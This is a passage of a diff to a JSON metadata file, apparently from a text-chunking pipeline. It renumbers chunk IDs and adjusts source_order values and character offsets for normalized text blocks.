+      "chunk_source_id": "ver_4d5e2f4d1c42_c00051_s000",
+      "chunk_id": "ver_4d5e2f4d1c42_c00051",
       "normalized_block_id": "nrm_ver_4d5e2f4d1c42_b00064",
-      "source_order": 3,
+      "source_order": 0,
       "start_offset": 0,
-      "end_offset": 45
-    },
-    {
-      "chunk_source_id": "ver_4d5e2f4d1c42_c00036_s004",
-      "chunk_id": "ver_4d5e2f4d1c42_c00036",
-      "normalized_block_id": "nrm_ver_4d5e2f4d1c42_b00064",
-      "source_order": 4,
-      "start_offset": 46,
       "end_offset": 59
     },
     {
-      "chunk_source_id": "ver_4d5e2f4d1c42_c00037_s000",
-      "chunk_id": "ver_4d5e2f4d1c42_c00037",
+      "chunk_source_id": "ver_4d5e2f4d1c42_c00052_s000",
+      "chunk_id": "ver_4d5e2f4d1c42_c00052",
       "normalized_block_id": "nrm_ver_4d5e2f4d1c42_b00065",
       "source_order": 0,
       "start_offset": 0,
       "end_offset": 12
     },
     {
-      "chunk_source_id": "ver_4d5e2f4d1c42_c00038_s000",
-      "chunk_id": "ver_4d5e2f4d1c42_c00038",
+      "chunk_source_id": "ver_4d5e2f4d1c42_c00053_s000",
+      "chunk_id": "ver_4d5e2f4d1c42_c00053",
       "normalized_block_id": "nrm_ver_4d5e2f4d1c42_b00066",
       "source_order": 0,
       "start_offset": 0,
       "end_offset": 151
     },
     {
-      "chunk_source_id": "ver_4d5e2f4d1c42_c00038_s001",
-      "chunk_id": "ver_4d5e2f4d1c42_c00038",
+      "chunk_source_id": "ver_4d5e2f4d1c42_c00053_s001",
+      "chunk_id": "ver_4d5e2f4d1c42_c00053",
       "normalized_block_id": "nrm_ver_4d5e2f4d1c42_b00066",
       "source_order": 1,
       "start_offset": 152,
       "end_offset": 208
     },
     {
-      "chunk_source_id": "ver_4d5e2f4d1c42_c00039_s000",
-      "chunk_id": "ver_4d5e2f4d1c42_c00039",
+      "chunk_source_id": "ver_4d5e2f4d1c42_c00054_s000",
+      "chunk_id": "ver_4d5e2f4d1c42_c00054",
       "normalized_block_id": "nrm_ver_4d5e2f4d1c42_b00067",
       "source_order": 0,
       "start_offset": 0,
       "end_offset": 10
     },
     {
-      "chunk_source_id": "ver_4d5e2f4d1c42_c00040_s000",
-      "chunk_id": "ver_4d5e2f4d1c42_c00040",
+      "chunk_source_id": "ver_4d5e2f4d1c42_c00055_s000",
+      "chunk_id": "ver_4d5e2f4d1c42_c00055",
       "normalized_block_id": "nrm_ver_4d5e2f4d1c42_b00068",
       "source_order": 0,
       "start_offset": 0,
       "end_offset": 132
     },
     {
-      "chunk_source_id": "ver_4d5e2f4d1c42_c00040_s001",
-      "chunk_id": "ver_4d5e2f4d1c42_c00040",
+      "chunk_source_id": "ver_4d5e2f4d1c42_c00056_s000",
+      "chunk_id": "ver_4d5e2f4d1c42_c00056",
       "normalized_block_id": "nrm_ver_4d5e2f4d1c42_b00069",
-      "source_order": 1,
+      "source_order": 0,
       "start_offset": 0,
       "end_offset": 101
     },
     {
-      "chunk_source_id": "ver_4d5e2f4d1c42_c00040_s002",
-      "chunk_id": "ver_4d5e2f4d1c42_c00040",
+      "chunk_source_id": "ver_4d5e2f4d1c42_c00057_s000",
+      "chunk_id": "ver_4d5e2f4d1c42_c00057",
       "normalized_block_id": "nrm_ver_4d5e2f4d1c42_b00070",
-      "source_order": 2,
+      "source_order": 0,
       "start_offset": 0,
       "end_offset": 80
     },
     {
-      "chunk_source_id": "ver_4d5e2f4d1c42_c00040_s003",
-      "chunk_id": "ver_4d5e2f4d1c42_c00040",
+      "chunk_source_id": "ver_4d5e2f4d1c42_c00057_s001",
+      "chunk_id": "ver_4d5e2f4d1c42_c00057",
       "normalized_block_id": "nrm_ver_4d5e2f4d1c42_b00071",
-      "source_order": 3,
+      "source_order": 1,
       "start_offset": 0,
       "end_offset": 229
     },
     {
-      "chunk_source_id": "ver_4d5e2f4d1c42_c00040_s004",
-      "chunk_id": "ver_4d5e2f4d1c42_c00040",
+      "chunk_source_id": "ver_4d5e2f4d1c42_c00057_s002",
+      "chunk_id": "ver_4d5e2f4d1c42_c00057",
       "normalized_block_id": "nrm_ver_4d5e2f4d1c42_b00072",
-      "source_order": 4,
+      "source_order": 2,
       "start_offset": 0,
       "end_offset": 73
     },
     {
-      "chunk_source_id": "ver_4d5e2f4d1c42_c00040_s005",
-      "chunk_id": "ver_4d5e2f4d1c42_c00040",
+      "chunk_source_id": "ver_4d5e2f4d1c42_c00057_s003",
+      "chunk_id": "ver_4d5e2f4d1c42_c00057",
       "normalized_block_id": "nrm_ver_4d5e2f4d1c42_b00072",
-      "source_order": 5,
+      "source_order": 3,
       "start_offset": 74,
       "end_offset": 173
     },
     {
-      "chunk_source_id": "ver_4d5e2f4d1c42_c00041_s000",
-      "chunk_id": "ver_4d5e2f4d1c42_c00041",
+      "chunk_source_id": "ver_4d5e2f4d1c42_c00058_s000",
+      "chunk_id": "ver_4d5e2f4d1c42_c00058",
       "normalized_block_id": "nrm_ver_4d5e2f4d1c42_b00073",
       "source_order": 0,
       "start_offset": 0,
       "end_offset": 9
     },
     {
-      "chunk_source_id": "ver_4d5e2f4d1c42_c00042_s000",
-      "chunk_id": "ver_4d5e2f4d1c42_c00042",
+      "chunk_source_id": "ver_4d5e2f4d1c42_c00059_s000",
+      "chunk_id": "ver_4d5e2f4d1c42_c00059",
       "normalized_block_id": "nrm_ver_4d5e2f4d1c42_b00074",
       "source_order": 0,
       "start_offset": 0,
       "end_offset": 37
     },
     {
-      "chunk_source_id": "ver_4d5e2f4d1c42_c00042_s001",
-      "chunk_id": "ver_4d5e2f4d1c42_c00042",
+      "chunk_source_id": "ver_4d5e2f4d1c42_c00059_s001",
+      "chunk_id": "ver_4d5e2f4d1c42_c00059",
       "normalized_block_id": "nrm_ver_4d5e2f4d1c42_b00074",
       "source_order": 1,
       "start_offset": 38,
       "end_offset": 191
     },
     {
-      "chunk_source_id": "ver_4d5e2f4d1c42_c00043_s000",
-      "chunk_id": "ver_4d5e2f4d1c42_c00043",
+      "chunk_source_id": "ver_4d5e2f4d1c42_c00060_s000",
+      "chunk_id": "ver_4d5e2f4d1c42_c00060",
       "normalized_block_id": "nrm_ver_4d5e2f4d1c42_b00075",
       "source_order": 0,
       "start_offset": 0,
       "end_offset": 18
     },
     {
-      "chunk_source_id": "ver_4d5e2f4d1c42_c00044_s000",
-      "chunk_id": "ver_4d5e2f4d1c42_c00044",
+      "chunk_source_id": "ver_4d5e2f4d1c42_c00061_s000",
+      "chunk_id": "ver_4d5e2f4d1c42_c00061",
       "normalized_block_id": "nrm_ver_4d5e2f4d1c42_b00076",
       "source_order": 0,
       "start_offset": 0,
       "end_offset": 111
     },
     {
-      "chunk_source_id": "ver_4d5e2f4d1c42_c00044_s001",
-      "chunk_id": "ver_4d5e2f4d1c42_c00044",
+      "chunk_source_id": "ver_4d5e2f4d1c42_c00061_s001",
+      "chunk_id": "ver_4d5e2f4d1c42_c00061",
       "normalized_block_id": "nrm_ver_4d5e2f4d1c42_b00077",
       "source_order": 1,
       "start_offset": 0,
       "end_offset": 260
     },
     {
-      "chunk_source_id": "ver_4d5e2f4d1c42_c00044_s002",
-      "chunk_id": "ver_4d5e2f4d1c42_c00044",
+      "chunk_source_id": "ver_4d5e2f4d1c42_c00061_s002",
+      "chunk_id": "ver_4d5e2f4d1c42_c00061",
       "normalized_block_id": "nrm_ver_4d5e2f4d1c42_b00078",
       "source_order": 2,
       "start_offset": 0,
       "end_offset": 123
     },
     {
-      "chunk_source_id": "ver_4d5e2f4d1c42_c00044_s003",
-      "chunk_id": "ver_4d5e2f4d1c42_c00044",
+      "chunk_source_id": "ver_4d5e2f4d1c42_c00061_s003",
+      "chunk_id": "ver_4d5e2f4d1c42_c00061",
       "normalized_block_id": "nrm_ver_4d5e2f4d1c42_b00079",
       "source_order": 3,
       "start_offset": 0,
       "end_offset": 110
     },
     {
-      "chunk_source_id": "ver_4d5e2f4d1c42_c00045_s000",
-      "chunk_id": "ver_4d5e2f4d1c42_c00045",
+      "chunk_source_id": "ver_4d5e2f4d1c42_c00062_s000",
+      "chunk_id": "ver_4d5e2f4d1c42_c00062",
       "normalized_block_id": "nrm_ver_4d5e2f4d1c42_b00080",
       "source_order": 0,
       "start_offset": 0,
       "end_offset": 26
     },
     {
-      "chunk_source_id": "ver_4d5e2f4d1c42_c00046_s000",
-      "chunk_id": "ver_4d5e2f4d1c42_c00046",
+      "chunk_source_id": "ver_4d5e2f4d1c42_c00063_s000",
+      "chunk_id": "ver_4d5e2f4d1c42_c00063",
       "normalized_block_id": "nrm_ver_4d5e2f4d1c42_b00081",
       "source_order": 0,
       "start_offset": 0,
       "end_offset": 107
     },
     {
-      "chunk_source_id": "ver_4d5e2f4d1c42_c00046_s001",
-      "chunk_id": "ver_4d5e2f4d1c42_c00046",
+      "chunk_source_id": "ver_4d5e2f4d1c42_c00063_s001",
+      "chunk_id": "ver_4d5e2f4d1c42_c00063",
       "normalized_block_id": "nrm_ver_4d5e2f4d1c42_b00081",
       "source_order": 1,
       "start_offset": 108,
       "end_offset": 237
     },
     {
-      "chunk_source_id": "ver_4d5e2f4d1c42_c00047_s000",
-      "chunk_id": "ver_4d5e2f4d1c42_c00047",
+      "chunk_source_id": "ver_4d5e2f4d1c42_c00064_s000",
+      "chunk_id": "ver_4d5e2f4d1c42_c00064",
       "normalized_block_id": "nrm_ver_4d5e2f4d1c42_b00082",
       "source_order": 0,
       "start_offset": 0,
       "end_offset": 20
     },
     {
-      "chunk_source_id": "ver_4d5e2f4d1c42_c00048_s000",
-      "chunk_id": "ver_4d5e2f4d1c42_c00048",
+      "chunk_source_id": "ver_4d5e2f4d1c42_c00065_s000",
+      "chunk_id": "ver_4d5e2f4d1c42_c00065",
       "normalized_block_id": "nrm_ver_4d5e2f4d1c42_b00083",
       "source_order": 0,
       "start_offset": 0,
       "end_offset": 81
     },
     {
-      "chunk_source_id": "ver_4d5e2f4d1c42_c00048_s001",
-      "chunk_id": "ver_4d5e2f4d1c42_c00048",
+      "chunk_source_id": "ver_4d5e2f4d1c42_c00065_s001",
+      "chunk_id": "ver_4d5e2f4d1c42_c00065",
       "normalized_block_id": "nrm_ver_4d5e2f4d1c42_b00084",
       "source_order": 1,
       "start_offset": 0,
       "end_offset": 122
     },
     {
-      "chunk_source_id": "ver_4d5e2f4d1c42_c00048_s002",
-      "chunk_id": "ver_4d5e2f4d1c42_c00048",
+      "chunk_source_id": "ver_4d5e2f4d1c42_c00065_s002",
+      "chunk_id": "ver_4d5e2f4d1c42_c00065",
       "normalized_block_id": "nrm_ver_4d5e2f4d1c42_b00084",
       "source_order": 2,
       "start_offset": 123,
       "end_offset": 206
     },
     {
-      "chunk_source_id": "ver_4d5e2f4d1c42_c00048_s003",
-      "chunk_id": "ver_4d5e2f4d1c42_c00048",
+      "chunk_source_id": "ver_4d5e2f4d1c42_c00065_s003",
+      "chunk_id": "ver_4d5e2f4d1c42_c00065",
       "normalized_block_id": "nrm_ver_4d5e2f4d1c42_b00085",
       "source_order": 3,
       "start_offset": 0,
       "end_offset": 101
     },
     {
-      "chunk_source_id": "ver_4d5e2f4d1c42_c00048_s004",
-      "chunk_id": "ver_4d5e2f4d1c42_c00048",
+      "chunk_source_id": "ver_4d5e2f4d1c42_c00065_s004",
+      "chunk_id": "ver_4d5e2f4d1c42_c00065",
       "normalized_block_id": "nrm_ver_4d5e2f4d1c42_b00085",
       "source_order": 4,
       "start_offset": 102,
       "end_offset": 208
     },
     {
-      "chunk_source_id": "ver_4d5e2f4d1c42_c00048_s005",
-      "chunk_id": "ver_4d5e2f4d1c42_c00048",
+      "chunk_source_id": "ver_4d5e2f4d1c42_c00065_s005",
+      "chunk_id": "ver_4d5e2f4d1c42_c00065",
       "normalized_block_id": "nrm_ver_4d5e2f4d1c42_b00085",
       "source_order": 5,
       "start_offset": 209,
       "end_offset": 262
     },
     {
-      "chunk_source_id": "ver_4d5e2f4d1c42_c00048_s006",
-      "chunk_id": "ver_4d5e2f4d1c42_c00048",
+      "chunk_source_id": "ver_4d5e2f4d1c42_c00065_s006",
+      "chunk_id": "ver_4d5e2f4d1c42_c00065",
       "normalized_block_id": "nrm_ver_4d5e2f4d1c42_b00085",
       "source_order": 6,
       "start_offset": 263,
       "end_offset": 325
     },
     {
-      "chunk_source_id": "ver_4d5e2f4d1c42_c00048_s007",
-      "chunk_id": "ver_4d5e2f4d1c42_c00048",
+      "chunk_source_id": "ver_4d5e2f4d1c42_c00065_s007",
+      "chunk_id": "ver_4d5e2f4d1c42_c00065",
       "normalized_block_id": "nrm_ver_4d5e2f4d1c42_b00085",
       "source_order": 7,
       "start_offset": 326,
       "end_offset": 408
     },
     {
-      "chunk_source_id": "ver_4d5e2f4d1c42_c00048_s008",
-      "chunk_id": "ver_4d5e2f4d1c42_c00048",
+      "chunk_source_id": "ver_4d5e2f4d1c42_c00065_s008",
+      "chunk_id": "ver_4d5e2f4d1c42_c00065",
       "normalized_block_id": "nrm_ver_4d5e2f4d1c42_b00085",
       "source_order": 8,
       "start_offset": 409,
       "end_offset": 510
     },
     {
-      "chunk_source_id": "ver_4d5e2f4d1c42_c00048_s009",
-      "chunk_id": "ver_4d5e2f4d1c42_c00048",
+      "chunk_source_id": "ver_4d5e2f4d1c42_c00065_s009",
+      "chunk_id": "ver_4d5e2f4d1c42_c00065",
       "normalized_block_id": "nrm_ver_4d5e2f4d1c42_b00085",
       "source_order": 9,
       "start_offset": 511,
       "end_offset": 595
     },
     {
-      "chunk_source_id": "ver_4d5e2f4d1c42_c00048_s010",
-      "chunk_id": "ver_4d5e2f4d1c42_c00048",
+      "chunk_source_id": "ver_4d5e2f4d1c42_c00065_s010",
+      "chunk_id": "ver_4d5e2f4d1c42_c00065",
       "normalized_block_id": "nrm_ver_4d5e2f4d1c42_b00085",
       "source_order": 10,
       "start_offset": 596,
       "end_offset": 716
     },
     {
-      "chunk_source_id": "ver_4d5e2f4d1c42_c00048_s011",
-      "chunk_id": "ver_4d5e2f4d1c42_c00048",
+      "chunk_source_id": "ver_4d5e2f4d1c42_c00065_s011",
+      "chunk_id": "ver_4d5e2f4d1c42_c00065",
       "normalized_block_id": "nrm_ver_4d5e2f4d1c42_b00085",
       "source_order": 11,
       "start_offset": 717,
       "end_offset": 807
     },
     {
-      "chunk_source_id": "ver_4d5e2f4d1c42_c00048_s012",
-      "chunk_id": "ver_4d5e2f4d1c42_c00048",
+      "chunk_source_id": "ver_4d5e2f4d1c42_c00065_s012",
+      "chunk_id": "ver_4d5e2f4d1c42_c00065",
       "normalized_block_id": "nrm_ver_4d5e2f4d1c42_b00085",
       "source_order": 12,
       "start_offset": 808,
       "end_offset": 880
     },
     {
-      "chunk_source_id": "ver_4d5e2f4d1c42_c00048_s013",
-      "chunk_id": "ver_4d5e2f4d1c42_c00048",
+      "chunk_source_id": "ver_4d5e2f4d1c42_c00065_s013",
+      "chunk_id": "ver_4d5e2f4d1c42_c00065",
       "normalized_block_id": "nrm_ver_4d5e2f4d1c42_b00085",
       "source_order": 13,
       "start_offset": 881,
       "end_offset": 961
     },
     {
-      "chunk_source_id": "ver_4d5e2f4d1c42_c00048_s014",
-      "chunk_id": "ver_4d5e2f4d1c42_c00048",
+      "chunk_source_id": "ver_4d5e2f4d1c42_c00065_s014",
+      "chunk_id": "ver_4d5e2f4d1c42_c00065",
       "normalized_block_id": "nrm_ver_4d5e2f4d1c42_b00085",
       "source_order": 14,
       "start_offset": 962,
       "end_offset": 1022
     },
     {
-      "chunk_source_id": "ver_4d5e2f4d1c42_c00048_s015",
-      "chunk_id": "ver_4d5e2f4d1c42_c00048",
+      "chunk_source_id": "ver_4d5e2f4d1c42_c00065_s015",
+      "chunk_id": "ver_4d5e2f4d1c42_c00065",
       "normalized_block_id": "nrm_ver_4d5e2f4d1c42_b00085",
       "source_order": 15,
       "start_offset": 1027,
       "end_offset": 1130
     },
     {
-      "chunk_source_id": "ver_4d5e2f4d1c42_c00048_s016",
-      "chunk_id": "ver_4d5e2f4d1c42_c00048",
+      "chunk_source_id": "ver_4d5e2f4d1c42_c00065_s016",
+      "chunk_id": "ver_4d5e2f4d1c42_c00065",
       "normalized_block_id": "nrm_ver_4d5e2f4d1c42_b00085",
       "source_order": 16,
       "start_offset": 1135,
       "end_offset": 1196
     },
     {
-      "chunk_source_id": "ver_4d5e2f4d1c42_c00048_s017",
-      "chunk_id": "ver_4d5e2f4d1c42_c00048",
+      "chunk_source_id": "ver_4d5e2f4d1c42_c00065_s017",
+      "chunk_id": "ver_4d5e2f4d1c42_c00065",
       "normalized_block_id": "nrm_ver_4d5e2f4d1c42_b00085",
       "source_order": 17,
       "start_offset": 1197,
       "end_offset": 1264
     },
     {
-      "chunk_source_id": "ver_4d5e2f4d1c42_c00048_s018",
-      "chunk_id": "ver_4d5e2f4d1c42_c00048",
+      "chunk_source_id": "ver_4d5e2f4d1c42_c00065_s018",
+      "chunk_id": "ver_4d5e2f4d1c42_c00065",
       "normalized_block_id": "nrm_ver_4d5e2f4d1c42_b00085",
       "source_order": 18,
       "start_offset": 1265,
       "end_offset": 1381
     },
     {
-      "chunk_source_id": "ver_4d5e2f4d1c42_c00048_s019",
-      "chunk_id": "ver_4d5e2f4d1c42_c00048",
+      "chunk_source_id": "ver_4d5e2f4d1c42_c00065_s019",
+      "chunk_id": "ver_4d5e2f4d1c42_c00065",
       "normalized_block_id": "nrm_ver_4d5e2f4d1c42_b00085",
       "source_order": 19,
       "start_offset": 1386,
       "end_offset": 1450
     },
     {
-      "chunk_source_id": "ver_4d5e2f4d1c42_c00048_s020",
-      "chunk_id": "ver_4d5e2f4d1c42_c00048",
+      "chunk_source_id": "ver_4d5e2f4d1c42_c00065_s020",
+      "chunk_id": "ver_4d5e2f4d1c42_c00065",
       "normalized_block_id": "nrm_ver_4d5e2f4d1c42_b00085",
       "source_order": 20,
       "start_offset": 1455,
       "end_offset": 1501
     },
     {
-      "chunk_source_id": "ver_4d5e2f4d1c42_c00048_s021",
-      "chunk_id": "ver_4d5e2f4d1c42_c00048",
+      "chunk_source_id": "ver_4d5e2f4d1c42_c00065_s021",
+      "chunk_id": "ver_4d5e2f4d1c42_c00065",
       "normalized_block_id": "nrm_ver_4d5e2f4d1c42_b00085",
       "source_order": 21,
       "start_offset": 1502,
       "end_offset": 1573
     },
     {
-      "chunk_source_id": "ver_4d5e2f4d1c42_c00048_s022",
-      "chunk_id": "ver_4d5e2f4d1c42_c00048",
+      "chunk_source_id": "ver_4d5e2f4d1c42_c00065_s022",
+      "chunk_id": "ver_4d5e2f4d1c42_c00065",
       "normalized_block_id": "nrm_ver_4d5e2f4d1c42_b00085",
       "source_order": 22,
       "start_offset": 1574,
       "end_offset": 1708
     },
     {
-      "chunk_source_id": "ver_4d5e2f4d1c42_c00049_s000",
-      "chunk_id": "ver_4d5e2f4d1c42_c00049",
+      "chunk_source_id": "ver_4d5e2f4d1c42_c00066_s000",
+      "chunk_id": "ver_4d5e2f4d1c42_c00066",
       "normalized_block_id": "nrm_ver_4d5e2f4d1c42_b00086",
       "source_order": 0,
       "start_offset": 0,
       "end_offset": 23
     },
     {
-      "chunk_source_id": "ver_4d5e2f4d1c42_c00050_s000",
-      "chunk_id": "ver_4d5e2f4d1c42_c00050",
+      "chunk_source_id": "ver_4d5e2f4d1c42_c00067_s000",
+      "chunk_id": "ver_4d5e2f4d1c42_c00067",
       "normalized_block_id": "nrm_ver_4d5e2f4d1c42_b00087",
       "source_order": 0,
       "start_offset": 0,
       "end_offset": 114
     },
     {
-      "chunk_source_id": "ver_4d5e2f4d1c42_c00050_s001",
-      "chunk_id": "ver_4d5e2f4d1c42_c00050",
+      "chunk_source_id": "ver_4d5e2f4d1c42_c00067_s001",
+      "chunk_id": "ver_4d5e2f4d1c42_c00067",
       "normalized_block_id": "nrm_ver_4d5e2f4d1c42_b00088",
       "source_order": 1,
       "start_offset": 0,
       "end_offset": 75
     },
     {
-      "chunk_source_id": "ver_4d5e2f4d1c42_c00050_s002",
-      "chunk_id": "ver_4d5e2f4d1c42_c00050",
+      "chunk_source_id": "ver_4d5e2f4d1c42_c00067_s002",
+      "chunk_id": "ver_4d5e2f4d1c42_c00067",
       "normalized_block_id": "nrm_ver_4d5e2f4d1c42_b00088",
       "source_order": 2,
       "start_offset": 76,
       "end_offset": 187
     },
     {
-      "chunk_source_id": "ver_4d5e2f4d1c42_c00050_s003",
-      "chunk_id": "ver_4d5e2f4d1c42_c00050",
+      "chunk_source_id": "ver_4d5e2f4d1c42_c00067_s003",
+      "chunk_id": "ver_4d5e2f4d1c42_c00067",
       "normalized_block_id": "nrm_ver_4d5e2f4d1c42_b00088",
       "source_order": 3,
       "start_offset": 188,
       "end_offset": 231
     },
     {
-      "chunk_source_id": "ver_4d5e2f4d1c42_c00050_s004",
-      "chunk_id": "ver_4d5e2f4d1c42_c00050",
+      "chunk_source_id": "ver_4d5e2f4d1c42_c00067_s004",
+      "chunk_id": "ver_4d5e2f4d1c42_c00067",
       "normalized_block_id": "nrm_ver_4d5e2f4d1c42_b00088",
       "source_order": 4,
       "start_offset": 232,
       "end_offset": 346
     },
     {
-      "chunk_source_id": "ver_4d5e2f4d1c42_c00050_s005",
-      "chunk_id": "ver_4d5e2f4d1c42_c00050",
+      "chunk_source_id": "ver_4d5e2f4d1c42_c00067_s005",
+      "chunk_id": "ver_4d5e2f4d1c42_c00067",
       "normalized_block_id": "nrm_ver_4d5e2f4d1c42_b00088",
       "source_order": 5,
       "start_offset": 347,
       "end_offset": 411
     },
     {
-      "chunk_source_id": "ver_4d5e2f4d1c42_c00050_s006",
-      "chunk_id": "ver_4d5e2f4d1c42_c00050",
+      "chunk_source_id": "ver_4d5e2f4d1c42_c00067_s006",
+      "chunk_id": "ver_4d5e2f4d1c42_c00067",
       "normalized_block_id": "nrm_ver_4d5e2f4d1c42_b00088",
       "source_order": 6,
       "start_offset": 416,
       "end_offset": 491
     },
     {
-      "chunk_source_id": "ver_4d5e2f4d1c42_c00050_s007",
-      "chunk_id": "ver_4d5e2f4d1c42_c00050",
+      "chunk_source_id": "ver_4d5e2f4d1c42_c00067_s007",
+      "chunk_id": "ver_4d5e2f4d1c42_c00067",
       "normalized_block_id": "nrm_ver_4d5e2f4d1c42_b00088",
       "source_order": 7,
       "start_offset": 496,
       "end_offset": 581
     },
     {
-      "chunk_source_id": "ver_4d5e2f4d1c42_c00050_s008",
-      "chunk_id": "ver_4d5e2f4d1c42_c00050",
+      "chunk_source_id": "ver_4d5e2f4d1c42_c00067_s008",
+      "chunk_id": "ver_4d5e2f4d1c42_c00067",
       "normalized_block_id": "nrm_ver_4d5e2f4d1c42_b00088",
       "source_order": 8,
       "start_offset": 582,
       "end_offset": 738
     },
     {
-      "chunk_source_id": "ver_4d5e2f4d1c42_c00051_s000",
-      "chunk_id": "ver_4d5e2f4d1c42_c00051",
+      "chunk_source_id": "ver_4d5e2f4d1c42_c00068_s000",
+      "chunk_id": "ver_4d5e2f4d1c42_c00068",
       "normalized_block_id": "nrm_ver_4d5e2f4d1c42_b00089",
       "source_order": 0,
       "start_offset": 0,
       "end_offset": 25
     },
     {
-      "chunk_source_id": "ver_4d5e2f4d1c42_c00052_s000",
-      "chunk_id": "ver_4d5e2f4d1c42_c00052",
+      "chunk_source_id": "ver_4d5e2f4d1c42_c00069_s000",
+      "chunk_id": "ver_4d5e2f4d1c42_c00069",
       "normalized_block_id": "nrm_ver_4d5e2f4d1c42_b00090",
       "source_order": 0,
       "start_offset": 0,
       "end_offset": 117
     },
     {
-      "chunk_source_id": "ver_4d5e2f4d1c42_c00052_s001",
-      "chunk_id": "ver_4d5e2f4d1c42_c00052",
+      "chunk_source_id": "ver_4d5e2f4d1c42_c00069_s001",
+      "chunk_id": "ver_4d5e2f4d1c42_c00069",
       "normalized_block_id": "nrm_ver_4d5e2f4d1c42_b00091",
       "source_order": 1,
       "start_offset": 0,
       "end_offset": 65
     },
     {
-      "chunk_source_id": "ver_4d5e2f4d1c42_c00052_s002",
-      "chunk_id": "ver_4d5e2f4d1c42_c00052",
+      "chunk_source_id": "ver_4d5e2f4d1c42_c00069_s002",
+      "chunk_id": "ver_4d5e2f4d1c42_c00069",
       "normalized_block_id": "nrm_ver_4d5e2f4d1c42_b00091",
       "source_order": 2,
       "start_offset": 66,
       "end_offset": 222
     },
     {
-      "chunk_source_id": "ver_4d5e2f4d1c42_c00052_s003",
-      "chunk_id": "ver_4d5e2f4d1c42_c00052",
+      "chunk_source_id": "ver_4d5e2f4d1c42_c00069_s003",
+      "chunk_id": "ver_4d5e2f4d1c42_c00069",
       "normalized_block_id": "nrm_ver_4d5e2f4d1c42_b00091",
       "source_order": 3,
       "start_offset": 227,
       "end_offset": 304
     },
     {
-      "chunk_source_id": "ver_4d5e2f4d1c42_c00052_s004",
-      "chunk_id": "ver_4d5e2f4d1c42_c00052",
+      "chunk_source_id": "ver_4d5e2f4d1c42_c00069_s004",
+      "chunk_id": "ver_4d5e2f4d1c42_c00069",
       "normalized_block_id": "nrm_ver_4d5e2f4d1c42_b00091",
       "source_order": 4,
       "start_offset": 309,
       "end_offset": 374
     },
     {
-      "chunk_source_id": "ver_4d5e2f4d1c42_c00052_s005",
-      "chunk_id": "ver_4d5e2f4d1c42_c00052",
+      "chunk_source_id": "ver_4d5e2f4d1c42_c00069_s005",
+      "chunk_id": "ver_4d5e2f4d1c42_c00069",
       "normalized_block_id": "nrm_ver_4d5e2f4d1c42_b00091",
       "source_order": 5,
       "start_offset": 379,
       "end_offset": 472
     },
     {
-      "chunk_source_id": "ver_4d5e2f4d1c42_c00053_s000",
-      "chunk_id": "ver_4d5e2f4d1c42_c00053",
+      "chunk_source_id": "ver_4d5e2f4d1c42_c00070_s000",
+      "chunk_id": "ver_4d5e2f4d1c42_c00070",
       "normalized_block_id": "nrm_ver_4d5e2f4d1c42_b00092",
       "source_order": 0,
       "start_offset": 0,
       "end_offset": 24
     },
     {
-      "chunk_source_id": "ver_4d5e2f4d1c42_c00054_s000",
-      "chunk_id": "ver_4d5e2f4d1c42_c00054",
+      "chunk_source_id": "ver_4d5e2f4d1c42_c00071_s000",
+      "chunk_id": "ver_4d5e2f4d1c42_c00071",
       "normalized_block_id": "nrm_ver_4d5e2f4d1c42_b00093",
       "source_order": 0,
       "start_offset": 0,
       "end_offset": 86
     },
     {
-      "chunk_source_id": "ver_4d5e2f4d1c42_c00054_s001",
-      "chunk_id": "ver_4d5e2f4d1c42_c00054",
+      "chunk_source_id": "ver_4d5e2f4d1c42_c00071_s001",
+      "chunk_id": "ver_4d5e2f4d1c42_c00071",
       "normalized_block_id": "nrm_ver_4d5e2f4d1c42_b00093",
       "source_order": 1,
       "start_offset": 87,
       "end_offset": 172
     },
     {
-      "chunk_source_id": "ver_4d5e2f4d1c42_c00054_s002",
-      "chunk_id": "ver_4d5e2f4d1c42_c00054",
+      "chunk_source_id": "ver_4d5e2f4d1c42_c00071_s002",
+      "chunk_id": "ver_4d5e2f4d1c42_c00071",
       "normalized_block_id": "nrm_ver_4d5e2f4d1c42_b00094",
       "source_order": 2,
       "start_offset": 0,
       "end_offset": 180
     },
     {
-      "chunk_source_id": "ver_4d5e2f4d1c42_c00054_s003",
-      "chunk_id": "ver_4d5e2f4d1c42_c00054",
+      "chunk_source_id": "ver_4d5e2f4d1c42_c00071_s003",
+      "chunk_id": "ver_4d5e2f4d1c42_c00071",
       "normalized_block_id": "nrm_ver_4d5e2f4d1c42_b00094",
       "source_order": 3,
       "start_offset": 181,
       "end_offset": 410
     },
     {
-      "chunk_source_id": "ver_4d5e2f4d1c42_c00054_s004",
-      "chunk_id": "ver_4d5e2f4d1c42_c00054",
+      "chunk_source_id": "ver_4d5e2f4d1c42_c00071_s004",
+      "chunk_id": "ver_4d5e2f4d1c42_c00071",
       "normalized_block_id": "nrm_ver_4d5e2f4d1c42_b00094",
       "source_order": 4,
       "start_offset": 411,
       "end_offset": 459
     },
     {
-      "chunk_source_id": "ver_4d5e2f4d1c42_c00054_s005",
-      "chunk_id": "ver_4d5e2f4d1c42_c00054",
+      "chunk_source_id": "ver_4d5e2f4d1c42_c00071_s005",
+      "chunk_id": "ver_4d5e2f4d1c42_c00071",
       "normalized_block_id": "nrm_ver_4d5e2f4d1c42_b00094",
       "source_order": 5,
       "start_offset": 464,
       "end_offset": 661
     },
     {
-      "chunk_source_id": "ver_4d5e2f4d1c42_c00054_s006",
-      "chunk_id": "ver_4d5e2f4d1c42_c00054",
+      "chunk_source_id": "ver_4d5e2f4d1c42_c00071_s006",
+      "chunk_id": "ver_4d5e2f4d1c42_c00071",
       "normalized_block_id": "nrm_ver_4d5e2f4d1c42_b00094",
       "source_order": 6,
       "start_offset": 662,
       "end_offset": 702
     },
     {
-      "chunk_source_id": "ver_4d5e2f4d1c42_c00054_s007",
-      "chunk_id": "ver_4d5e2f4d1c42_c00054",
+      "chunk_source_id": "ver_4d5e2f4d1c42_c00071_s007",
+      "chunk_id": "ver_4d5e2f4d1c42_c00071",
       "normalized_block_id": "nrm_ver_4d5e2f4d1c42_b00094",
       "source_order": 7,
       "start_offset": 707,
       "end_offset": 786
     },
     {
-      "chunk_source_id": "ver_4d5e2f4d1c42_c00054_s008",
-      "chunk_id": "ver_4d5e2f4d1c42_c00054",
+      "chunk_source_id": "ver_4d5e2f4d1c42_c00071_s008",
+      "chunk_id": "ver_4d5e2f4d1c42_c00071",
       "normalized_block_id": "nrm_ver_4d5e2f4d1c42_b00095",
       "source_order": 8,
       "start_offset": 0,
       "end_offset": 67
     },
     {
-      "chunk_source_id": "ver_4d5e2f4d1c42_c00054_s009",
-      "chunk_id": "ver_4d5e2f4d1c42_c00054",
